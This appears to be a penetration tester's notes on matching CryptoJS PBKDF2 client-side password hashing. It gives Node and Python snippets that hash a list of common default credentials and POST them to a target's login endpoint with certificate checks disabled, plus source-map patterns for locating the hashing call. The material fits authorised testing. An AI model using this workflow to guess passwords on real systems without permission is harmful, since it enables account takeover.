# CryptoJS PBKDF2 Login Testing

## Problem

When a web app uses `CryptoJS.PBKDF2(password, salt).toString()` for client-side password hashing before sending to the server, Python's `hashlib.pbkdf2_hmac()` does NOT produce matching output due to different defaults.

## CryptoJS Defaults vs Python

| Parameter | CryptoJS Default | Python hashlib |
|-----------|-----------------|----------------|
| Hash algorithm | SHA1 (in older) / SHA256 (newer) | Must specify |
| Iterations | 1 | Must specify |
| Key size | 4 words = 128 bits = 16 bytes | Must specify (dklen) |
| Salt format | String (UTF-8 treated as WordArray) | Must encode |
| Output | Hex string (WordArray.toString()) | bytes (must .hex()) |

## Solution: Use Node.js CryptoJS

```bash
# Install
npm install crypto-js

# Generate hash
node -e "
const CryptoJS = require('crypto-js');
const hash = CryptoJS.PBKDF2('PASSWORD', 'USERNAME').toString();
console.log(hash);
"
```

## Batch testing with Node.js

```bash
node -e "
const CryptoJS = require('crypto-js');
const creds = [
    ['admin', 'admin'],
    ['admin', 'P@ssw0rd!'],
    ['user1', 'Welcome1'],
];
creds.forEach(([user, pwd]) => {
    const hash = CryptoJS.PBKDF2(pwd, user).toString();
    console.log(user + ':' + pwd + ' -> ' + hash);
});
"
```

## Then test login with the hash

```python
import requests
url = 'https://target/auth/login'
data = {"loginId": "admin", "passwd": "<hash_from_node>", "grant_type": "password"}
r = requests.post(url, json=data, verify=False)
print(r.json())
```

## Key Lessons (LoanPlatform, June 2026)

- Python hashlib tried 8 combinations of (sha1/sha256 × iter 1/1000 × keylen 16/32) — ALL failed
- Node.js CryptoJS produced correct hash instantly with just `CryptoJS.PBKDF2(pwd, user).toString()`
- The difference is how CryptoJS handles string-to-WordArray conversion internally
- ALWAYS use the same library the target app uses for hash generation
- Source maps reveal the exact call: `encryptPBKDF2Pass=function(t,e){return S.a.PBKDF2(t,e).toString()}`

## Detection in Source Maps

Look for patterns:
- `CryptoJS.PBKDF2(` or `S.a.PBKDF2(`
- `encryptPBKDF2Pass`
- `PBKDF2(t,e).toString()`

The salt is typically the username (second parameter).
